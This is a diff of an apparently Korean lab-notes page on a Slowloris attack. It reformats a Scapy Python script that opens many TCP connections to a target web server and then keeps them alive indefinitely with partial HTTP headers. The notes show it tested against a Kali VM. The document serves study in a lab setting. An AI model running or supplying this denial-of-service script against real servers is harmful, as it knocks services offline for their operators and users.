@@ -27,29 +27,29 @@ Updated: Dec 11, 2019 10:48 PM
             syn.append(IP(dst=target)/TCP(sport=RandNum(1024,65535),dport=80,flags='S'))
     		
     		syn_ack = sr(syn, verbose=0)[0]
-    
-        ack = []
-        for sa in syn_ack :
-            payload = "GET /{} HTTP/1.1\r\n".format(str(RandNum(1,num))) +\
-            "Host: {}\r\n".format(target) +\
-            "User-Agent: Mozilla/4.0\r\n" +\
-            "Content-Length: 42\r\n"
-    
-            ack.append(IP(dst=target)/TCP(sport=sa[1].dport,dport=80,flags="A",seq=sa[1].ack,ack=sa[1].seq+1)/payload)
-        
-        answer = sr(ack, verbose=0)[0]
-        print "{} connection success!\t Fail: {}".format(len(answer), num-len(answer))
-        print "Sending data \"X-a: b\\r\\n\".."
-    
-        count = 1
-        while True :
-            print "{} time sending".format(count)
-            ack = []
-            for ans in answer :
-                ack.append(IP(dst=target)/TCP(sport=ans[1].dport,dport=80,flags="PA",seq=ans[1].ack,ack=ans[1].seq)/"X-a: b\r\n")
-            answer = sr(ack, inter=0.5, verbose=0)[0]
-            time.sleep(10)
-            count += 1
+    	
+    	ack = []
+    	for sa in syn_ack :
+    	    payload = "GET /{} HTTP/1.1\r\n".format(str(RandNum(1,num))) +\
+    	    "Host: {}\r\n".format(target) +\
+    	    "User-Agent: Mozilla/4.0\r\n" +\
+    	    "Content-Length: 42\r\n"
+    	
+    	    ack.append(IP(dst=target)/TCP(sport=sa[1].dport,dport=80,flags="A",seq=sa[1].ack,ack=sa[1].seq+1)/payload)
+    	
+    	answer = sr(ack, verbose=0)[0]
+    	print "{} connection success!\t Fail: {}".format(len(answer), num-len(answer))
+    	print "Sending data \"X-a: b\\r\\n\".."
+    	
+    	count = 1
+    	while True :
+    	    print "{} time sending".format(count)
+    	    ack = []
+    	    for ans in answer :
+    	        ack.append(IP(dst=target)/TCP(sport=ans[1].dport,dport=80,flags="PA",seq=ans[1].ack,ack=ans[1].seq)/"X-a: b\r\n")
+    	    answer = sr(ack, inter=0.5, verbose=0)[0]
+    	    time.sleep(10)
+    	    count += 1
     
     if __name__ == "__main__" :
         if len(sys.argv) < 3 :
@@ -66,7 +66,7 @@ Updated: Dec 11, 2019 10:48 PM
     - `python [slowloris.py](http://slowloris.py/) KALI#1_IP 50`
     50개의 패킷을 Kalli #1에게 전송
 
-        ![Day%207%20Slowloris%20Attack/Untitled.png](Day%207%20Slowloris%20Attack/Untitled.png)
+        ![Day%207%20Slowloris%20Attack/Untitled.png](images/Day%207%20Slowloris%20Attack/Untitled.png)
 
 - **Kally #1의 브라우저 (localhost/server-status)**
 - 50개의 패킷 요청을 읽고 있음
